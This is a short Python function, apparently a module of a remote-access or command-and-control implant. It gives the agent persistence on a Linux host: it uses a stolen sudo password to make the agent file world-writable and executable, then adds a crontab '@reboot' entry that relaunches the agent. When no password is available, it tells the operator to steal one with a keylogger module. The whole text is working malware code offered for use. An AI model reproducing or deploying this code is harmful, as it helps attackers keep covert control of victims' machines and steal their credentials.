def persistance(task_id):

    import subprocess
    global responses
    global sudo
    agent_name = "prova.py"
    cwd = os.getcwd()

    if sudo != "":
        subprocess.call('echo ' + sudo + ' | sudo -S chmod 777 ' + agent_name, shell=True)
        
        subprocess.call('crontab -l > mycron.tmp', shell=True)
        subprocess.call('echo "@reboot sleep 30 && cd ' + cwd + ' && ./' + agent_name + '" >> mycron.tmp', shell=True)
        subprocess.call('crontab mycron.tmp', shell=True)
        subprocess.call('rm mycron.tmp', shell=True)
        

        response = {
                'task_id': task_id,
                "user_output": "crontab scheduled at each reboot",
                'completed': True
            }

        responses.append(response)


    else:
        response = {
                'task_id': task_id,
                "user_output": "Sudo password not acquired or wrong. Use keylog module to try stealing",
                'completed': False
            }
        responses.append(response)